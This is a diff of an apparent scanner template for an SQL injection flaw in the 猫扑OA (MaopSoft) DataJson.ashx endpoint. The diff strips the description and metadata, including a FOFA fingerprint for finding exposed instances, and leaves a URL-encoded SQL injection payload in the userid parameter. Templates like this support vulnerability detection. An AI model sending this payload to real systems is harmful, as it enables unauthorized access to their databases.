@@ -3,12 +3,8 @@ info:
   name: 猫扑OA DataJson.ashx 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/aewvbgfuq6dxmfcx'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: aewvbgfuq6dxmfcx
-    fofa: body="您是MaopSoft的VIP客户"
 http:
 - raw:
   - 'GET /api/Html/Document/DataJson.ashx?userid=-8575+OR+2250+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28106%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%282250%3D2250%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29 HTTP/1.1
